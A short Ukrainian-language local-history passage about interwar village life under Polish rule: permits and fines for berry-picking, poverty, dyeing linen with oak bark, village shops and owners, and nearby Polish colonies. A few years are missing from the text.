	<p>Щоб отримати дозвіл на збирання чорниць потрібно було купити квитанцію. Люди, які не мали квитанції, але перебували в ліси без дозволу і займалися збиральництвом змушені були платити штрафи. Найстаршим в селі був поляк, але він був дуже жорстокий, тому його було вбито.</p>
<p>Тоді було прислали іншого поляка. Люди жили бідно, не було в що одягтись та взутися. Переважна більшість людей ходила в постолах і це було дуже незручно. Одяг був із льону, хто хотів, той міг пофарбувати. Фарбували полотно дубовою корою. У казанок наливали воду, вкидали туди дубову кору, щоб вона добре покипіла. Потім вкидали полотно, і тримали стільки, скільки потрібно для кольору. Довше — яскравіше, менше — світліше. Але на одяг ніхто не зважав, головне, щоб було що їсти.</p>
<p>На село було два магазини, які були власністю євреїв. Цим магазином володів українець на ім'я Курильчик Павло Степанович  р. В цьому магазині був значно менший асортимент товарів ніж у магазинах євреїв. Також за часів поліського панування цегельний завод належав цьому ж чоловікові Павлу. Розпочинаючи з року навколо села було створено ряд польських колоній. А зокрема: Храпачев, Хомині острови, Вороновка, Головки, Гайочки.</p>
